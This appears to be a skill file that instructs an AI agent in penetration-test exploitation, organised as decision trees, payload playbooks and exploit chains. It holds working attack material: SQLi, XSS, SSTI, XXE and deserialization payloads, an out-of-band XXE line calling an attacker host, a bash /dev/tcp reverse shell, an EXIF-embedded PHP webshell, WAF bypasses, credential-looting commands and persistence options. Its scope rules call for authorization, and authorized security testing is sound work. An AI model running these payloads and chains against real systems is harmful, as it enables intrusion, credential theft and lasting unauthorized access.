---
name: exploitation
description: Validate exploitation paths in a controlled manner to confirm impact. Covers web application, network service, and binary exploitation with real-world methodology and exploit chaining.
---

# Exploitation Skill

## Overview
Validate exploitation paths in a controlled manner to confirm impact. This skill covers
web application, network service, and binary exploitation with real-world methodology.

## Scope Rules
1. Only operate on explicitly authorized targets.
2. External targets: exploitation requires explicit authorization (external_exploit=explicit_only).
3. Prefer non-destructive validation and stop after proof.
4. Never deploy persistence unless explicitly authorized and in scope.

---

## Decision Tree â€” What Did Recon Find?

```
START â†’ What's the target surface?
â”‚
â”œâ”€â”€ Web Application Found
â”‚   â”œâ”€â”€ Input fields/params â†’ Test SQLi ðŸŸ¢, XSS ðŸŸ¢, SSTI ðŸŸ¡
â”‚   â”‚   â”œâ”€â”€ SQLi confirmed â†’ references/exploit_chains.md Chain 1 or Chain 4
â”‚   â”‚   â”œâ”€â”€ XSS confirmed â†’ references/exploit_chains.md Chain 2
â”‚   â”‚   â””â”€â”€ SSTI confirmed â†’ tplmap â†’ RCE â†’ reverse shell
â”‚   â”œâ”€â”€ File upload exists â†’ Test upload bypass ðŸŸ¡ â†’ Chain 5
â”‚   â”œâ”€â”€ URL fetch/webhook â†’ Test SSRF ðŸŸ¢ â†’ Chain 3
â”‚   â”œâ”€â”€ XML parsing â†’ Test XXE ðŸŸ¢ â†’ file read â†’ SSRF pivot
â”‚   â”œâ”€â”€ API with IDs â†’ Test IDOR ðŸŸ¢ â†’ Chain 6
â”‚   â””â”€â”€ Serialized data (cookies, params) â†’ Test deserialization ðŸŸ¡
â”‚
â”œâ”€â”€ Network Services Found
â”‚   â”œâ”€â”€ SMB (445) â†’ null session â†’ EternalBlue check â†’ cred spray
â”‚   â”œâ”€â”€ SSH (22) â†’ known creds? â†’ key reuse? â†’ CVE check
â”‚   â”œâ”€â”€ RDP (3389) â†’ BlueKeep check â†’ cred spray
â”‚   â”œâ”€â”€ FTP (21) â†’ anonymous login â†’ version exploits
â”‚   â””â”€â”€ Custom service â†’ searchsploit â†’ Metasploit check
â”‚
â”œâ”€â”€ Cloud Environment
â”‚   â”œâ”€â”€ SSRF available â†’ metadata endpoint â†’ IAM creds â†’ Chain 3
â”‚   â”œâ”€â”€ Exposed S3/blob â†’ bucket enumeration â†’ data access
â”‚   â””â”€â”€ Exposed credentials â†’ aws sts get-caller-identity â†’ enumerate
â”‚
â””â”€â”€ Binary/Custom App â†’ buffer overflow â†’ ROP â†’ see binary_exploitation.md
```

**Output-Driven Routing:**
- Found SQLi â†’ load `exploitation` (this skill) + chain to `privesc` after shell
- Found cloud creds â†’ load `exploitation` + chain to `cloud_exploitation`
- Found credentials â†’ load `lateral_movement` for password reuse/spray
- Got shell â†’ load `privesc` immediately, then `discovery` for internal enum
- Found domain creds â†’ load `lateral_movement` + `active_directory`

---

## Methodology

### 1. Targeted Exploit Selection
- Use confirmed findings from vulnerability assessment (vulns.json).
- Cross-reference CVEs with Exploit-DB, NVD, and vendor advisories.
- Prefer non-destructive validation â€” read-only proof before write/exec.
- Prioritize: RCE > Auth Bypass > Data Leak > DoS.

### 1.1 Exploit-DB & MITRE Correlation (Required)
- Use Exploit-DB locally before ad-hoc payloads.
- Search with `searchsploit` using exact product/version strings (capture output).
- If you need structured results, parse `/usr/share/exploitdb/files_exploits.csv` with a quick `python3` one-liner.
- Record evidence to `evidence/exploitdb.txt` (or `exploitdb.json`) and cite the EDB-ID.
- When a vuln is confirmed, include a MITRE technique ID in memory tags, e.g.:
  - `[REMEMBER: vulnerability_found] SQL Injection (T1190) at /login`

---

## Web Exploitation Playbook

### SQL Injection (T1190)
**Detection â†’ Confirmation â†’ Exploitation:**
1. ðŸŸ¢ **Blind boolean:** `' AND 1=1-- -` vs `' AND 1=2-- -` â€” observe response differences.
2. ðŸŸ¢ **Time-based blind:** `' AND IF(1=1,SLEEP(5),0)-- -` â€” measure response delay.
3. ðŸŸ¡ **Union-based:** `' UNION SELECT NULL,NULL,NULL-- -` â€” increment columns until no error.
4. ðŸŸ¡ **Error-based:** `' AND 1=CONVERT(int,(SELECT @@version))-- -` â€” force DB errors to leak data.
5. ðŸŸ¡ **Second-order:** Inject in registration/profile, trigger on admin panel or export.
6. ðŸ”´ **Full automation:** `sqlmap -u 'URL' --batch --level=5 --risk=3 --technique=BEUSTQ`
  - **If blocked** â†’ WAF bypass tampers: `--tamper=space2comment,between,randomcase`
  - **If filtered** â†’ switch to time-based: `--technique=T --time-sec=2`
  - **If param blocked** â†’ try headers/cookies: `--level=3` tests Cookie/Referer/UA
  - See: `references/failure_recovery.md` and `references/advanced_techniques.md`

### Cross-Site Scripting (XSS)
- ðŸŸ¢ **Reflected:** `"><script>alert(document.domain)</script>` in URL params.
- ðŸŸ¢ **Stored:** Inject in profile/comment fields, trigger on victim page view.
- ðŸŸ¢ **DOM-based:** Check `location.hash`, `document.URL`, `window.name` sinks.
- ðŸŸ¡ **Polyglot:** `jaVasCript:/*-/*\`/*\\`/*'/*"/**/(/* */oNcLiCk=alert())//%0D%0A`
- ðŸŸ¡ **Filter bypass:** Use `dalfox` for automated context-aware XSS fuzzing.
  - **If `<script>` blocked** â†’ event handlers: `<img src=x onerror=alert(1)>`
  - **If all tags blocked** â†’ try JS context breakout: `';alert(1)//`
  - **If all XSS fails** â†’ try SSTI: `{{7*7}}` in same field
  - See: `references/failure_recovery.md`

### Server-Side Request Forgery (SSRF)
- ðŸŸ¢ **Internal access:** `http://127.0.0.1:PORT/admin` or `http://[::1]:PORT/`
- ðŸŸ¢ **Cloud metadata:** `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
- ðŸŸ¢ **Azure metadata:** `http://169.254.169.254/metadata/instance?api-version=2021-02-01` (Header: `Metadata: true`)
- ðŸŸ¢ **GCP metadata:** `http://metadata.google.internal/computeMetadata/v1/` (Header: `Metadata-Flavor: Google`)
- ðŸŸ¡ **Protocol smuggling:** `gopher://`, `dict://`, `file:///etc/passwd`
  - **If URL blocked** â†’ decimal IP: `http://2852039166/`, hex: `http://0xA9FEA9FE/`
  - **If localhost blocked** â†’ DNS rebinding, redirect chains, IPv6
  - See: `references/failure_recovery.md` and `references/advanced_techniques.md`

### XML External Entity (XXE)
- **File read:** `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`
- **SSRF via XXE:** `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal:8080/">]>`
- **Blind OOB:** `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER/evil.dtd"> %xxe;]>`
- **RCE (PHP expect):** `<!ENTITY xxe SYSTEM "expect://id">`

### Deserialization
- ðŸŸ¡ **Java:** `ysoserial` â€” `java -jar ysoserial.jar CommonsCollections6 'id' | base64`
- ðŸŸ¡ **PHP:** Craft `O:` serialized objects targeting `__wakeup()` / `__destruct()`, or phar:// wrapper.
- ðŸŸ¡ **Python:** `pickle.loads()` with `__reduce__` RCE payloads.
- ðŸ”´ **.NET:** `ysoserial.net` â€” target `BinaryFormatter`, `ObjectStateFormatter`.
- **Detection:** Look for `rO0AB` (Java base64), `O:` (PHP), `gASV` (Python pickle).
  - **If gadget chain fails** â†’ try URLDNS (no deps) to confirm deser, then iterate chains
  - **Advanced:** phar:// for PHP, JRMP two-stage for Java, ViewState for .NET
  - See: `references/advanced_techniques.md`

### File Upload
- ðŸŸ¡ **Webshell:** Upload `.php`, `.jsp`, `.aspx` with command exec.
- ðŸŸ¡ **Polyglot:** Image with PHP in EXIF: `exiftool -Comment='<?php system($_GET["c"]); ?>' image.jpg`
- ðŸŸ¡ **Extension bypass:** `.php5`, `.pHp`, `.php.jpg`, `.php%00.jpg`, `.php;.jpg`
- ðŸŸ¡ **Content-Type bypass:** Change `Content-Type: image/jpeg` for PHP upload.
  - **If extension blocked** â†’ `.phtml`, `.phar`, double extension, null byte, NTFS ADS (`::$DATA`)
  - **If content checked** â†’ magic bytes prefix: `\xFF\xD8\xFF\xE0` + PHP code
  - **If all blocked** â†’ template editor, log poisoning, ZIP path traversal
  - See: `references/failure_recovery.md`

### IDOR / BOLA (T1190)
- ðŸŸ¢ **Sequential IDs:** `/api/user/1001` â†’ `/api/user/1002` â€” check access control.
- ðŸŸ¢ **UUID leak:** Check JS files, API responses, error messages for UUIDs.
- ðŸŸ¡ **Parameter pollution:** `?id=1001&id=1002` â€” test parser behavior.

### Server-Side Template Injection (SSTI)
- **Detection:** `{{7*7}}` â†’ `49` confirms template execution.
- **Jinja2 RCE:** `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`
- **Twig RCE:** `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`
- **Freemarker:** `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`
- **Automation:** `tplmap -u 'http://target/?name=test' --os-shell`

---

## Network Exploitation

### Metasploit Workflow (T1210)
```
msfconsole -q
msf6> search type:exploit name:<service_keyword>
msf6> use exploit/path/to/module
msf6> show options
msf6> set RHOSTS <target>
msf6> set RPORT <port>
msf6> set LHOST <attacker_ip>
msf6> set PAYLOAD <payload_type>    # e.g., linux/x64/meterpreter/reverse_tcp
msf6> check                         # non-destructive validation first
msf6> exploit
```

### Service-Specific Exploits
- **SMB (445):** EternalBlue (MS17-010), SMBGhost (CVE-2020-0796), null sessions.
  - `crackmapexec smb TARGET -u '' -p '' --shares`
- **RDP (3389):** BlueKeep (CVE-2019-0708), NLA bypass, credential spraying.
- **SSH (22):** CVE-2024-6387 (regreSSHion), key-based auth bypass, agent forwarding abuse.
- **FTP (21):** Anonymous login, ProFTPd exploits, vsftpd 2.3.4 backdoor.
- **HTTP/S:** See Web Exploitation Playbook above.

### Manual Exploit Compilation
```bash
searchsploit -m <EDB-ID>                     # mirror exploit locally
gcc exploit.c -o exploit -lpthread            # compile C exploit
python3 exploit.py --target <IP> --port <PORT> # run Python exploit
# Always read the source first â€” verify it's not malicious
```

---

## Exploit Chaining

### Web â†’ Shell â†’ Root Path
1. **Recon findings** â†’ identify tech stack, versions, entry points.
2. **Initial access** â†’ SQLi for auth bypass OR file upload for webshell.
3. **Command execution** â†’ upgrade from web vuln to OS command exec.
4. **Reverse shell** â†’ `bash -i >& /dev/tcp/LHOST/LPORT 0>&1` or use msfvenom.
5. **Shell upgrade** â†’ `python3 -c 'import pty;pty.spawn("/bin/bash")'` then `stty raw -echo; fg`.
6. **Privilege escalation** â†’ hand off to privesc skill.

### Combining Vulnerabilities
- SSRF + cloud metadata â†’ IAM credentials â†’ lateral movement.
- SQLi + file write â†’ webshell â†’ RCE.
- XSS + CSRF â†’ admin action as victim â†’ account takeover.
- IDOR + PII leak â†’ credential reuse â†’ auth bypass.
- LFI + log poisoning â†’ RCE via injected PHP in access logs.

---

## Binary Exploitation (Lab/CTF)

### Buffer Overflow
1. **Fuzzing:** Send increasing payloads, find crash offset with `pattern_create.rb`.
2. **EIP control:** Overwrite return address with `pattern_offset.rb`.
3. **Shellcode:** `msfvenom -p linux/x86/shell_reverse_tcp LHOST=IP LPORT=PORT -b '\x00' -f python`
4. **NOP sled:** Pad shellcode with `\x90` for reliability.

### ROP Chains
- Use `ropper` or `ROPgadget` to find gadgets.
- Chain `pop rdi; ret` â†’ `/bin/sh` address â†’ `system()` for ret2libc.
- Bypass NX/DEP with return-oriented programming.

### Format String
- **Read stack:** `%x.%x.%x.%x` â€” leak stack values.
- **Arbitrary read:** `%s` with controlled address on stack.
- **Arbitrary write:** `%n` to write byte count to address.

---

## Proof of Impact (Required)
Every confirmed exploit MUST demonstrate impact:
- **Data access:** Screenshot/capture of sensitive data retrieved.
- **Command execution:** Output of `id`, `whoami`, `hostname`.
- **File read:** Contents of `/etc/passwd`, `web.config`, or equivalent.
- **Reverse shell:** Screenshot of interactive shell with `id` output.
- **Auth bypass:** Access to admin panel or privileged function.

## Post-Exploitation Pivot
Immediately after gaining a shell:
1. Run `id && whoami && hostname && ip a` â€” capture context.
2. Stabilize shell (pty upgrade, screen/tmux).
3. Hand off to **discovery** skill for internal enumeration.
4. Document access level and pivot potential in `access.json`.

---

## Examples
See [examples/sqli-to-shell.md](examples/sqli-to-shell.md) for SQL injection to OS shell chain.
See [examples/ssrf-cloud-metadata.md](examples/ssrf-cloud-metadata.md) for SSRF to cloud credential theft.
See [examples/file-upload-rce.md](examples/file-upload-rce.md) for file upload bypass to webshell.

---

## Deep Dives
Load references when needed:
1. Target selection: `references/target_selection.md`
2. Proof of impact: `references/proof_of_impact.md`
3. Containment: `references/containment.md`
4. Explicit-only actions: `references/explicit_only_actions.md`
5. Web exploitation: `references/web_exploitation.md`
6. Network exploitation: `references/network_exploitation.md`
7. Binary exploitation: `references/binary_exploitation.md`
8. Exploit chaining: `references/exploit_chaining.md`
9. **Advanced techniques:** `references/advanced_techniques.md` â€” WAF bypass, second-order injection, blind OOB, deserialization deep-dive, SSRF chains, race conditions
10. **Full exploit chains:** `references/exploit_chains.md` â€” 6 complete attack chains with exact commands at every step
11. **OPSEC ratings:** `references/opsec_ratings.md` â€” ðŸŸ¢ðŸŸ¡ðŸ”´ noise level for every technique, log signatures, noise reduction
12. **Failure recovery:** `references/failure_recovery.md` â€” when each technique fails, exactly what to try next

## MITRE ATT&CK Mappings
- T1190 â€” Exploit Public-Facing Application
- T1203 â€” Exploitation for Client Execution
- T1210 â€” Exploitation of Remote Services
- T1211 â€” Exploitation for Defense Evasion
- T1068 â€” Exploitation for Privilege Escalation
- T1212 â€” Exploitation for Credential Access

## Tools Available
See `tools.yaml` for full list. Key tools:
- metasploit, sqlmap, commix, searchsploit, nuclei
- dalfox (XSS), tplmap (SSTI), ysoserial (deserialization)
- ffuf/wfuzz (parameter fuzzing), curl, burpsuite (reference)

## Evidence Collection
1. Exploit output logs with timestamps.
2. Proof of access (screenshots, command output).
3. `evidence.json` with scope approvals and minimal proof artifacts.
4. `findings.json` with confirmed impact notes and MITRE technique IDs.
5. `evidence/exploitdb.txt` or `evidence/exploitdb.json` for EDB lookups.
6. `access.json` with shell type, privilege level, and credentials obtained.

---

## Chain to Next Phase

After successful exploitation, load the appropriate next skill:

| What You Got | Next Skill | Action |
|-------------|-----------|--------|
| Unprivileged shell (www-data, apache) | `privesc` | Run linpeas/winpeas, check sudo -l, SUID bins |
| Database credentials | `exploitation` (continue) | Dump tables, look for more creds, pivot to other services |
| Cloud IAM credentials | `cloud_exploitation` | Enumerate permissions, S3/EC2 access, pivot to other accounts |
| Domain user credentials | `lateral_movement` | CrackMapExec, Pass-the-Hash, Kerberoasting |
| Admin panel access | `exploitation` (continue) | Find RCE via upload, template edit, or plugin install |
| Root/SYSTEM shell | `discovery` | Internal enum, network mapping, look for domain controller |
| Container shell | `privesc` â†’ container escape | Check for privileged mode, docker.sock, host PID namespace |

**Post-Exploitation Immediate Actions:**
1. Stabilize shell: `python3 -c 'import pty;pty.spawn("/bin/bash")'` â†’ `stty raw -echo; fg`
2. Capture evidence: `id && whoami && hostname && ip a && cat /etc/os-release`
3. Record in `access.json`: shell type, user, host, how you got in
4. Loot: `grep -r 'password\|secret\|api_key' /var/www/ /opt/ /home/ 2>/dev/null | head -30`
5. Persist (if authorized): SSH key, cron job, or webshell as backup access

---

## Success Criteria
- Exploit validated safely with minimal impact.
- Evidence captured, documented, and linked to MITRE techniques.
- Post-exploitation handoff documented.
